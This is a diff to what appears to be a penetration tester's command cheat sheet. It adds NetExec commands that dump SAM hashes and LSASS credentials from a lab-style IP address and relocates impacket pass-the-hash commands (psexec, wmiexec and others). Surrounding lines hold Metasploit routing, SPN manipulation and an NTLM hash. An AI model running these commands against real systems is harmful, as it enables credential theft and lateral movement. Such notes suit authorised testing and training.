@@ -474,6 +474,10 @@ background
 sessions
 sessions -i 1
 
+[*] Hash Dumping
+nxc smb 10.129.121.76 -u '$USERNAME' -H '$HASH' --sam --local-auth
+nxc smb 10.129.121.76 -u '$USERNAME' -H '$HASH' -M lsassy --local-auth
+
 [*] Enumeration
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 cd C:\ & dir /S /B SAM == SYSTEM == SAM.* == SYSTEM.*
@@ -525,12 +529,6 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 # Lateral Movement
 ## Linux
 ## Windows
-[*] Pass The Hash
-impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
-impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
-impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
-impacket-smbexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
-
 [*] Metasploit
 run post/multi/manage/autoroute
 run post/multi/manage/autoroute ACTION=delete
@@ -541,3 +539,10 @@ set RHOSTS 10.10.10.1-2
 set SMBUser Administrator
 set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
 run
+[*] Pass The Hash
+impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+impacket-smbexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+
+
